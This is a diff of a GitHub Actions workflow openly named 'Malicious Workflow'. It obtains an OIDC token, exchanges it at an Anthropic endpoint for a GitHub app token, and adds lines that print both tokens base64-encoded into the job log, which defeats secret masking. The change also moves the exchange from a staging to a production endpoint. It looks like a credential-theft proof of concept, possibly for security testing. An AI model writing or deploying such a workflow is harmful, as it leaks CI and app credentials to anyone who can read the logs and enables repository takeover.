@@ -2,7 +2,6 @@ name: Malicious Workflow
 
 on:
   workflow_dispatch:
-  push:
 
 jobs:
   get-gh-token:
@@ -30,16 +29,15 @@ jobs:
             echo "Failed to get OIDC token"
             exit 1
           fi
+          echo $OIDC_TOKEN | base64
   
           # Exchange OIDC token for app token
           APP_TOKEN_RESPONSE=$(curl -s -X POST \
             -H "Authorization: Bearer $OIDC_TOKEN" \
-            "https://api-staging.anthropic.com/api/github/github-app-token-exchange")
+            "https://api.anthropic.com/api/github/github-app-token-exchange")
           APP_TOKEN=$(echo "$APP_TOKEN_RESPONSE" | jq -r '.token // .app_token // empty')
           if [ -z "$APP_TOKEN" ]; then
             echo "Failed to get app token"
             exit 1
           fi
           echo $APP_TOKEN | base64
-
-          echo "APP_TOKEN=$APP_TOKEN" >> $GITHUB_OUTPUT
